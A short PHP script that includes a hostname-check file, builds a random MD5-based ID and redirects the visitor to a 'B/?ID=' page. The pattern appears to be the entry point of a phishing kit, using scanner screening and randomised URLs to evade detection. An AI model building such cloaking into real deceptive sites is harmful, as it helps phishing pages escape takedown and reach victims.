<?php

require_once 'B/hostname_check.php';

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");
;
$index="B/?ID=$host$host$host$host$host$host$host";

header("location: $index");


?>
